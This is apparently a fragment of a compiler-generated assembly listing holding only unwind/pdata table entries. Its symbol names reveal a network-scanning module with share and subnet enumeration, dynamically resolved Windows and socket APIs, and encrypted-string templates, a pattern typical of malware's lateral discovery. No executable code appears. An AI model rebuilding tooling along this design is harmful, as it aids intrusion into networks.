	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_array_new_length@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?_Throw_bad_array_new_length@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+58
	DD	imagerel $unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+90
	DD	imagerel $unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+53
	DD	imagerel $unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlen_string@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?_Xlen_string@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$allocator@_W@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??0?$allocator@_W@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+93
	DD	imagerel $unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+71
	DD	imagerel $unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+117
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+226
	DD	imagerel $unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD imagerel $LN5
	DD	imagerel $LN5+271
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?StartScan@network_scanner@@YAXXZ DD imagerel $LN25
	DD	imagerel $LN25+805
	DD	imagerel $unwind$?StartScan@network_scanner@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z DD imagerel $LN16
	DD	imagerel $LN16+735
	DD	imagerel $unwind$?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCancelIo@@YAHPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pCancelIo@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWaitForSingleObject@@YAKPEAXK@Z DD imagerel $LN3
	DD	imagerel $LN3+89
	DD	imagerel $unwind$?pWaitForSingleObject@@YAKPEAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetLastError@@YAKXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?pGetLastError@@YAKXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcatW@@YAPEA_WPEA_WPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?plstrcatW@@YAPEA_WPEA_WPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCloseHandle@@YAHPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pCloseHandle@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?plstrcpyW@@YAPEA_WPEA_WPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z DD imagerel $LN3
	DD	imagerel $LN3+137
	DD	imagerel $unwind$?pCreateThread@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@_KP6AKPEAX@Z2KPEAK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcmpiW@@YAHPEB_W0@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?plstrcmpiW@@YAHPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z DD imagerel $LN3
	DD	imagerel $LN3+145
	DD	imagerel $unwind$?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pDeleteTimerQueue@@YAHPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pDeleteTimerQueue@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z DD imagerel $LN3
	DD	imagerel $LN3+125
	DD	imagerel $unwind$?pGetQueuedCompletionStatus@@YAHPEAXPEAKPEA_KPEAPEAU_OVERLAPPED@@K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pExitThread@@YAXK@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$?pExitThread@@YAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z DD imagerel $LN3
	DD	imagerel $LN3+113
	DD	imagerel $unwind$?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSleep@@YAXK@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$?pSleep@@YAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGlobalAlloc@@YAPEAXI_K@Z DD imagerel $LN3
	DD	imagerel $LN3+89
	DD	imagerel $unwind$?pGlobalAlloc@@YAPEAXI_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGlobalFree@@YAPEAXPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pGlobalFree@@YAPEAXPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pDeleteCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z DD imagerel $LN3
	DD	imagerel $LN3+115
	DD	imagerel $unwind$?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateTimerQueue@@YAPEAXXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?pCreateTimerQueue@@YAPEAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pNetApiBufferFree@@YAKPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pNetApiBufferFree@@YAKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z DD imagerel $LN3
	DD	imagerel $LN3+149
	DD	imagerel $unwind$?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z DD imagerel $LN3
	DD	imagerel $LN3+103
	DD	imagerel $unwind$?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pgethostbyname@@YAPEAUhostent@@PEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pgethostbyname@@YAPEAUhostent@@PEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pgethostname@@YAHPEADH@Z DD imagerel $LN3
	DD	imagerel $LN3+89
	DD	imagerel $unwind$?pgethostname@@YAHPEADH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z DD imagerel $LN3
	DD	imagerel $LN3+171
	DD	imagerel $unwind$?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pclosesocket@@YAH_K@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pclosesocket@@YAH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z DD imagerel $LN3
	DD	imagerel $LN3+125
	DD	imagerel $unwind$?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z DD imagerel $LN3
	DD	imagerel $LN3+131
	DD	imagerel $unwind$?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pbind@@YAH_KPEBUsockaddr@@H@Z DD imagerel $LN3
	DD	imagerel $LN3+103
	DD	imagerel $unwind$?pbind@@YAH_KPEBUsockaddr@@H@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?psetsockopt@@YAH_KHHPEBDH@Z DD imagerel $LN3
	DD	imagerel $LN3+123
	DD	imagerel $unwind$?psetsockopt@@YAH_KHHPEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pgetsockopt@@YAH_KHHPEADPEAH@Z DD imagerel $LN3
	DD	imagerel $LN3+125
	DD	imagerel $unwind$?pgetsockopt@@YAH_KHHPEADPEAH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pshutdown@@YAH_KH@Z DD imagerel $LN3
	DD	imagerel $LN3+89
	DD	imagerel $unwind$?pshutdown@@YAH_KH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSAStartup@@YAHGPEAUWSAData@@@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pWSAStartup@@YAHGPEAUWSAData@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWSACleanup@@YAHXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?pWSACleanup@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pStrStrIA@@YAPEBDPEBD0@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pStrStrIA@@YAPEBDPEBD0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pinet_ntoa@@YAPEADUin_addr@@@Z DD imagerel $LN3
	DD	imagerel $LN3+77
	DD	imagerel $unwind$?pinet_ntoa@@YAPEADUin_addr@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?positive_modulo@@YAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+74
	DD	imagerel $unwind$?positive_modulo@@YAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetCurrentIpAddress@@YAKXZ DD imagerel $LN5
	DD	imagerel $LN5+163
	DD	imagerel $unwind$?GetCurrentIpAddress@@YAKXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetConnectEX@@YAHXZ DD imagerel $LN6
	DD	imagerel $LN6+334
	DD	imagerel $unwind$?GetConnectEX@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetSubnets@@YAHPEAUsubnet_list_@@@Z DD imagerel $LN22
	DD	imagerel $LN22+1110
	DD	imagerel $unwind$?GetSubnets@@YAHPEAUsubnet_list_@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+3440
	DD	imagerel $unwind$??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+3440
